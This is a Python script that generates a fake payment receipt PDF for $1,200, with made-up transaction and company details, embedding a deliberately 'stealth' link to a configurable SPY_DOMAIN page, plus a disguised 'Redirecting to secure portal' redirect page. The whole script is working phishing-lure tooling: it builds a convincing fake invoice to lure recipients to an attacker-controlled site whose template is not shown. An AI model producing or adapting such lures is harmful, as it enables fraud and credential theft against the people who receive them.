#!/usr/bin/env python3
from fpdf import FPDF
import base64
import os
from datetime import datetime

class InvoicePDF(FPDF):
    def header(self):
        # Company logo area
        self.set_font('Helvetica', 'B', 24)
        self.set_text_color(76, 175, 80)
        self.cell(0, 15, 'PAYMENT RECEIPT', align='C', new_x='LMARGIN', new_y='NEXT')
        self.ln(5)
        
    def footer(self):
        self.set_y(-15)
        self.set_font('Helvetica', 'I', 8)
        self.set_text_color(128)
        self.cell(0, 10, f'Generated on {datetime.now().strftime("%B %d, %Y")}', align='C')

# Read template HTML
with open('template.html', 'r', encoding='utf-8') as f:
    html_content = f.read()

# Get domain from environment or use default
domain = os.getenv('SPY_DOMAIN', 'localhost:3000')

# Create a minimal HTML redirect page
redirect_html = f"""<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh" content="0;url=http://{domain}/template.html">
    <script>window.location.href='http://{domain}/template.html';</script>
</head>
<body style="font-family:Arial;text-align:center;padding:50px;">
    <h2>Loading Account Details...</h2>
    <p>Redirecting to secure portal...</p>
</body>
</html>"""

# Encode HTML to base64
b64_html = base64.b64encode(html_content.encode('utf-8')).decode('utf-8')

# Try both methods: HTTP URL (more compatible) and data URI (backup)
http_url = f"http://{domain}/template.html"
data_uri = f"data:text/html;base64,{b64_html}"

# Use HTTP URL by default (more compatible with PDF readers)
link_url = http_url

# Create professional PDF
pdf = InvoicePDF()
pdf.set_auto_page_break(auto=True, margin=15)
pdf.add_page()

# Receipt Number
pdf.set_font('Helvetica', '', 10)
pdf.set_text_color(100)
pdf.cell(0, 10, 'Receipt #INV-A-9921', align='R', new_x='LMARGIN', new_y='NEXT')
pdf.ln(5)

# Amount Section with green border box
pdf.set_fill_color(245, 250, 245)
pdf.set_draw_color(76, 175, 80)
pdf.set_line_width(1)
y_pos = pdf.get_y()
pdf.rect(15, y_pos, 180, 30, 'DF')
pdf.set_xy(20, y_pos + 5)
pdf.set_font('Helvetica', '', 10)
pdf.set_text_color(80)
pdf.cell(0, 5, 'Amount Paid', new_x='LMARGIN', new_y='NEXT')
pdf.set_x(20)
pdf.set_font('Helvetica', 'B', 22)
pdf.set_text_color(46, 125, 50)
pdf.cell(0, 12, '$1,200.00 USD', new_x='LMARGIN', new_y='NEXT')
pdf.ln(15)

# Details Section
pdf.set_font('Helvetica', '', 11)
pdf.set_text_color(0)

details = [
    ('Date:', 'November 6, 2025'),
    ('Payment Method:', 'Credit Card (****4532)'),
    ('Transaction ID:', 'TXN-2025-110692-A'),
    ('Status:', 'Confirmed'),
]

for label, value in details:
    pdf.set_font('Helvetica', 'B', 11)
    pdf.cell(60, 10, label)
    pdf.set_font('Helvetica', '', 11)
    if 'Confirmed' in value:
        pdf.set_text_color(76, 175, 80)
        pdf.cell(0, 10, f'[OK] {value}', new_x='LMARGIN', new_y='NEXT')
        pdf.set_text_color(0)
    else:
        pdf.cell(0, 10, value, new_x='LMARGIN', new_y='NEXT')

pdf.ln(10)

# Stealth clickable text - NO visible button, just normal text with link
pdf.set_draw_color(220)
pdf.line(15, pdf.get_y(), 195, pdf.get_y())
pdf.ln(8)

pdf.set_font('Helvetica', '', 10)
pdf.set_text_color(80)
pdf.multi_cell(0, 6, 
    'This receipt confirms your payment has been processed successfully.\n'
    'For complete transaction details and account history:'
)

pdf.ln(3)

# STEALTH CLICKABLE TEXT - underlined blue link (looks normal)
pdf.set_font('Helvetica', 'U', 11)  # Underlined to show it's clickable
pdf.set_text_color(33, 150, 243)  # Blue color like a normal link

# Save position for link annotation
link_x = pdf.get_x()
link_y = pdf.get_y()
link_text = 'Click here to view your account details'

# Write the text first to measure width
pdf.cell(pdf.get_string_width(link_text) + 2, 7, link_text, new_x='LMARGIN', new_y='NEXT', link=link_url)

# Reset formatting
pdf.set_font('Helvetica', '', 10)
pdf.set_text_color(80)

pdf.ln(10)

# Instructions
pdf.line(15, pdf.get_y(), 195, pdf.get_y())
pdf.ln(5)
pdf.set_font('Helvetica', '', 10)
pdf.set_text_color(80)
pdf.multi_cell(0, 6, 
    'This receipt confirms your payment has been processed successfully.\n'
    'For complete transaction details, please view this document in a web browser.'
)

pdf.ln(5)
pdf.set_text_color(100)
pdf.multi_cell(0, 5, 
    'Questions? Contact: support@company.com\n'
    'Phone: +1 (800) 123-4567\n'
    'Business Hours: Mon-Fri 9AM-5PM EST'
)

pdf.ln(10)

# Company footer
pdf.set_draw_color(220)
pdf.line(15, pdf.get_y(), 195, pdf.get_y())
pdf.ln(3)
pdf.set_font('Helvetica', '', 8)
pdf.set_text_color(120)
pdf.multi_cell(0, 4,
    'Payment Services Inc.\n'
    '1234 Finance Street, New York, NY 10001\n'
    'Tax ID: 12-3456789 | License: FIN-2025-NYC'
)

pdf.ln(5)

# Embedded HTML notice (for technical viewers)
pdf.set_font('Helvetica', 'I', 8)
pdf.set_text_color(150)
pdf.multi_cell(0, 5, 
    f'Technical: This PDF contains a link to enhanced account viewing.\n'
    f'Link URL: {link_url}'
)

# Save PDF
pdf.output('invoice.pdf')

print('[OK] Professional PDF generated: invoice.pdf')
print(f'[OK] Configured for domain: {domain}')
print(f'[OK] Link URL: {link_url}')
print(f'[OK] File size: {os.path.getsize("invoice.pdf")} bytes')
print(f'[OK] Embedded HTML length: {len(html_content)} characters')
print(f'[OK] Click "Click here to view your account details" to test')